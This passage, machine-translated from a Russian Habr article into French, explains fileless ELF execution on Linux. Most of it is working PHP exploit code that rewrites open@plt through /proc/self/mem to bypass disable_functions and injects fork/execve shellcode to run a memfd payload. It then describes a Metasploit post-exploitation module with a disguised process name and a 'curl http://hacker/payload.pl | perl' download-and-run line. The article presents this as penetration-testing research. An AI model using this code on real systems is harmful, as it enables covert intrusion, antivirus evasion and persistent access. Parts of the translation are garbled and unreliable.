$dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) { $name_off = unp(substr($bin, $i, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == '__libc_system') { $system_offset = unp(substr($bin, $i + 8, 8)); } if($name == '__open') { $open_offset = unp(substr($bin, $i + 8, 8)); } } return array($system_offset, $open_offset); }</span></span></code> </pre> <br><p>  De plus, nous affichons des informations sur la version install√©e de PHP: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>)) { $version = explode(<span class="hljs-string"><span class="hljs-string">'.'</span></span>, PHP_VERSION); define(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>, ($version[<span class="hljs-number"><span class="hljs-number">0</span></span>] * <span class="hljs-number"><span class="hljs-number">10000</span></span> + $version[<span class="hljs-number"><span class="hljs-number">1</span></span>] * <span class="hljs-number"><span class="hljs-number">100</span></span> + $version[<span class="hljs-number"><span class="hljs-number">2</span></span>])); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (PHP_VERSION_ID &lt; <span class="hljs-number"><span class="hljs-number">50207</span></span>) { define(<span class="hljs-string"><span class="hljs-string">'PHP_MAJOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">0</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_MINOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">1</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_RELEASE_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">2</span></span>]); } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PHP major version "</span></span> . PHP_MAJOR_VERSION . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p>  Nous v√©rifions la profondeur de bits du syst√®me d'exploitation et la version du noyau Linux: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strpos(php_uname(<span class="hljs-string"><span class="hljs-string">'a'</span></span>), <span class="hljs-string"><span class="hljs-string">'x86_64'</span></span>) === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] This exploit is for x64 Linux. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(substr(php_uname(<span class="hljs-string"><span class="hljs-string">'r'</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>) &lt; <span class="hljs-number"><span class="hljs-number">2.98</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Too old kernel (&lt; 2.98). Might not work\n"</span></span>; }</code> </pre> <br><p>  Afin de contourner les restrictions de <code>disable_functions</code> , le script r√©√©crit l'adresse de la fonction <code>open@plt</code> √† la vol√©e.  Nous avons fait quelques ajouts au code beched'a, et maintenant nous pouvons mettre notre shellcode en m√©moire. </p><br><p>  Vous devez d'abord trouver le d√©calage dans le fichier binaire de l'interpr√©teur PHP lui-m√™me, pour cela nous nous tournons vers <code>/proc/self/exe</code> et analysons le fichier ex√©cutable en utilisant la fonction <code>parseelf()</code> d√©crite ci-dessus: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open@plt offset in PHP binary\n"</span></span>; $open_php = parseelf(<span class="hljs-string"><span class="hljs-string">'/proc/self/exe'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($open_php == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[+] Offset is 0x'</span></span> . dechex($open_php) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $maps = file_get_contents(<span class="hljs-string"><span class="hljs-string">'/proc/self/maps'</span></span>); preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(/.+libc\-.+)#'</span></span>, $maps, $r); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Libc location: $r[1]\n"</span></span>; preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(.+\[stack\].*)#'</span></span>, $maps, $m); $stack = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $m[<span class="hljs-number"><span class="hljs-number">1</span></span>])[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Stack location: "</span></span>.dechex($stack).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $pie_base = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $maps)[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PIE base: "</span></span>.dechex($pie_base).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open and system symbols from Libc\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">list</span></span>($system_offset, $open_offset) = parseelf($r[<span class="hljs-number"><span class="hljs-number">1</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($system_offset == <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> $open_offset == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p>  Trouvez l'adresse de la fonction <code>open()</code> : </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Got them. Seeking for address in memory\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'rb'</span></span>); fseek($mem, ((PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base) + $open_php); $open_addr = unp(fread($mem, <span class="hljs-number"><span class="hljs-number">8</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[INFO] open@plt addr: 0x'</span></span> . dechex($open_addr) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Rewriting open@plt address\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'wb'</span></span>);</code> </pre> <br><p>  Vous pouvez maintenant acc√©der directement au t√©l√©chargement de notre fichier ex√©cutable. <br>  Cr√©ez d'abord un fichier anonyme: </p><br><pre> <code class="php hljs">$shellcode_loc = $pie_base + <span class="hljs-number"><span class="hljs-number">0x100</span></span>; $shellcode=<span class="hljs-string"><span class="hljs-string">"\x48\x31\xD2\x52\x54\x5F\x6A\x01\x5E\x68\x3F\x01\x00\x00\x58\x0F\x05\x5A\xC3"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fseek($mem, (PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base + $open_php); fwrite($mem, packlli($shellcode_loc)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Address written. Executing cmd\n"</span></span>; $fp = fopen(<span class="hljs-string"><span class="hljs-string">'fd'</span></span>, <span class="hljs-string"><span class="hljs-string">'w'</span></span>);</code> </pre> <br><p>  Nous √©crivons la charge dans un fichier anonyme: </p><br><pre> <code class="php hljs">fwrite($fp, $elf);</code> </pre> <br><p>  Nous recherchons le num√©ro de descripteur de fichier: </p><br><pre> <code class="php hljs">$found = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $fds = scandir(<span class="hljs-string"><span class="hljs-string">"/proc/self/fd"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>($fds <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $fd) { $path = <span class="hljs-string"><span class="hljs-string">"/proc/self/fd/$fd"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!is_link($path)) <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strstr(readlink($path), <span class="hljs-string"><span class="hljs-string">"memfd"</span></span>)) { $found = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!$found) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[-] memfd not found'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p>  Ensuite, nous √©crivons le chemin d'acc√®s au fichier ex√©cutable sur la pile: </p><br><pre> <code class="php hljs">fseek($mem, $stack); fwrite($mem, <span class="hljs-string"><span class="hljs-string">"{$path}\x00"</span></span>); $filename_ptr = $stack; $stack += strlen($path) + <span class="hljs-number"><span class="hljs-number">1</span></span>; fseek($mem, $stack);</code> </pre> <br><p>  Et les arguments √† ex√©cuter sont pass√©s √† l'ex√©cutable: </p><br><pre> <code class="php hljs">fwrite($mem, str_replace(<span class="hljs-string"><span class="hljs-string">" "</span></span>, <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, $args) . <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>); $str_ptr = $stack; $argv_ptr = $arg_ptr = $stack + strlen($args) + <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>(explode(<span class="hljs-string"><span class="hljs-string">' '</span></span>, $args) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $arg) { fseek($mem, $arg_ptr); fwrite($mem, packlli($str_ptr)); $arg_ptr += <span class="hljs-number"><span class="hljs-number">8</span></span>; $str_ptr += strlen($arg) + <span class="hljs-number"><span class="hljs-number">1</span></span>; } fseek($mem, $arg_ptr); fwrite($mem, packlli(<span class="hljs-number"><span class="hljs-number">0x0</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Argv: "</span></span> . $args . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p>  Ensuite, en appelant <code>fork()</code> , nous ex√©cutons notre charge utile: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Starting ELF\n"</span></span>; $shellcode = <span class="hljs-string"><span class="hljs-string">"\x6a\x39\x58\x0f\x05\x85\xc0\x75\x28\x6a\x70\x58\x0f\x05\x6a\x39\x58\x0f\x05\x85\xc0\x75\x1a\x48\xbf"</span></span> . packlli($filename_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\xbe"</span></span> . packlli($argv_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\x31\xd2\x6a\x3b\x58\x0f\x05\xc3\x6a\x00\x5f\x6a\x3c\x58\x0f\x05"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fopen(<span class="hljs-string"><span class="hljs-string">'done'</span></span>, <span class="hljs-string"><span class="hljs-string">'r'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>();</code> </pre> <br><h4 id="shellkod">  Shellcode </h4><br><p>  Shellcode signifie g√©n√©ralement une s√©quence d'octets qui sont stock√©s en m√©moire puis ex√©cut√©s, g√©n√©ralement dans le contexte d'un autre programme, √† l'aide d'attaques de d√©passement de tampon et autres.  Dans notre cas, le shellcode ne nous renvoie pas l'invite de commande du serveur distant (en fait Shell), mais nous permet d'ex√©cuter les commandes dont nous avons besoin. </p><br><p>  Pour obtenir la s√©quence d'octets requise, vous pouvez soit √©crire du code C, puis le traduire en langage assembleur, ou √©crire le langage assembleur √† partir de z√©ro. </p><br><p>  Voyons ce qui se cache derri√®re la s√©quence d'octets des listes ci-dessus. </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p>  Le lancement de notre programme commence par c <code>fork</code> .  57 est la valeur num√©rique de l'identificateur d'appel syst√®me pour les syst√®mes 64 bits.  Le tableau se trouve <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . </p><br><p>  Ensuite, nous appelons <code>setsid</code> (identificateur num√©rique 112) pour convertir le processus enfant en parent: </p><br><pre> <code class="plaintext hljs">push 112 pop rax syscall</code> </pre> <br><p>  Ensuite, faites une autre <code>fork</code> : </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p>  <code>execve()</code> ensuite le familier <code>execve()</code> : </p><br><pre> <code class="plaintext hljs">; execve mov rdi, 0xcafebabecafebabe ; filename mov rsi, 0xdeadbeefdeadbeef ; argv xor rdx, rdx ; envp push 0x3b pop rax syscall push -1 pop rax ret</code> </pre> <br><p>  Et nous terminons le processus avec <code>exit()</code> (60): </p><br><pre> <code class="plaintext hljs">; exit quit: push 0 pop rdi push 60 pop rax syscall</code> </pre> <br><p>  Ainsi, nous avons remplac√© le code de la fonction open () lors de vos d√©placements.  Notre fichier ex√©cutable a √©t√© plac√© en m√©moire et ex√©cut√© au moyen de l'interpr√©teur PHP.  Les appels syst√®me sont pr√©sent√©s sous forme de shellcodes. </p><br><h3 id="metasploit-framework">  Cadre Metasploit </h3><br><p>  En tant que compilation des techniques ci-dessus, nous avons pr√©par√© un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">module pour MSF</a> . </p><br><p>  Pour l'ajouter √† Metasploit, copiez simplement le fichier du module dans le r√©pertoire <code>$HOME/.msf4/module/post/linux/manage/download_exec_elf_in_memory.rb</code> , puis ex√©cutez la commande <code>reload_all</code> dans la console du framework. <br>  Pour utiliser notre module, entrez <code>use post/linux/manage/download_exec_elf_in_memory</code> (ou un autre chemin, selon le r√©pertoire dans lequel le fichier de module a √©t√© plac√©) <br>  Avant de l'utiliser, vous devez d√©finir les options n√©cessaires.  La liste des options s'affiche avec la commande <code>show options</code> . </p><br><p>  <code>ARGS</code> - Arguments pour l'ex√©cutable </p><br><p>  <code>FILE</code> - chemin d'acc√®s au fichier ex√©cutable.  Dans notre cas, c'est Netcat. </p><br><p>  <code>NAME</code> est le nom du processus.  Vous pouvez l'appeler n'importe quoi.  Par exemple, pour des raisons de furtivit√©, cela peut √™tre kworker: 1 bien, ou dans le but de d√©montrer quelque chose de comique, par exemple KittyCat </p><br><p>  <code>SESSION</code> - session meterpreter.  Il est entendu que ce module sera utilis√© √† des fins de post-op√©ration. </p><br><p>  Ensuite, nous d√©signons l'h√¥te sur lequel le serveur http avec notre charge sera situ√© et son port dans les <code>SRVPORT</code> <code>SRVHOST</code> et <code>SRVPORT</code> respectivement. </p><br><p>  <code>VECTOR</code> - la m√©thode par laquelle l'ex√©cution du programme en m√©moire sera r√©alis√©e, le param√®tre est facultatif, s'il est vide, le script lui-m√™me √©tablira la pr√©sence des interpr√®tes n√©cessaires.  PHP, Python ou Perl sont actuellement pris en charge. </p><br><p>  <code>run</code> √† l'aide de la commande <code>exploit</code> ou <code>run</code> </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/y9vRUItW_5c" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><p>  Cela fonctionne comme suit - nous indiquons la session souhait√©e, il peut s'agir d'un m√®tre-m√®tre ou d'un reverse-shell normal.  Ensuite, nous indiquons le chemin local vers notre elfe, les arguments et le nom souhait√© dans la liste des processus.  Apr√®s le d√©marrage, un serveur Web local sera lanc√© pour h√©berger la charge utile, et la session recherchera des ¬´chaises ber√ßantes¬ª, curl et wget sont actuellement pris en charge.  Apr√®s avoir trouv√© au moins l'un d'entre eux, tous les interpr√®tes seront recherch√©s si nous n'avons pas sp√©cifi√© dans le param√®tre <code>VECTOR</code> celui dont nous avons besoin.  Eh bien, en cas de succ√®s, une commande sera ex√©cut√©e pour t√©l√©charger la charge utile de notre serveur Web et la transf√©rer via un canal vers l'interpr√©teur souhait√©, c'est-√†-dire  quelque chose comme <code>$ curl http://hacker/payload.pl | perl</code> <code>$ curl http://hacker/payload.pl | perl</code> </p><br><h3 id="vmesto-zaklyucheniya">  Au lieu d'une conclusion. </h3><br><p>  Le t√©l√©chargement sans fichier de fichiers ELF sous Linux est une technique utile pour les tests de p√©n√©tration.  Il s'agit d'une m√©thode assez silencieuse qui peut r√©sister √† une large gamme d'outils de protection antivirus, de syst√®mes de surveillance de l'int√©grit√© et de syst√®mes de surveillance qui surveillent les changements dans le contenu du disque dur.  De cette fa√ßon, vous pouvez facilement conserver l'acc√®s au syst√®me cible, tout en laissant un minimum de traces. <br>  Dans cet article, nous avons utilis√© des langages de programmation interpr√©t√©s, souvent install√©s par d√©faut sur les distributions Linux, les micrologiciels, les routeurs et les appareils mobiles.  Je voudrais √©galement remercier l'auteur de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">cet article</a> , qui nous a inspir√© cette revue. </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr430902/">https://habr.com/ru/post/fr430902/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr430890/index.html">O√π l'agilit√© est terrible, surtout la m√™l√©e</a></li>
<li><a href="../fr430892/index.html">La combinaison d'une approche multiplateforme et native dans le d√©veloppement d'applications mobiles</a></li>
<li><a href="../fr430894/index.html">Situation: les marques d√©pensent de plus en plus d'argent pour la publicit√© dans les podcasts - nous comprenons pourquoi</a></li>
<li><a href="../fr430896/index.html">Linux Foundation a √©tabli des fonds pour GraphQL et Ceph - pourquoi sont-ils n√©cessaires et √† quoi s'attendre d'eux</a></li>
<li><a href="../fr430900/index.html">Le premier laser de l'histoire: ce que c'√©tait</a></li>
<li><a href="../fr430906/index.html">Maman dort tranquillement la nuit - nous collectons OpenCV pour Raspbian'a</a></li>
<li><a href="../fr430908/index.html">Module de contr√¥le du convertisseur de puissance: d√©veloppement et assemblage</a></li>
<li><a href="../fr430910/index.html">Bourse Fulbright: comment et pourquoi?</a></li>
<li><a href="../fr430912/index.html">Nous amenons un menteur √† l'eau potable: un entretien n'est pas une relation de travail. Naturellement</a></li>
<li><a href="../fr430914/index.html">Analyse des prix du march√© noir pour les donn√©es personnelles et perc√©e</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>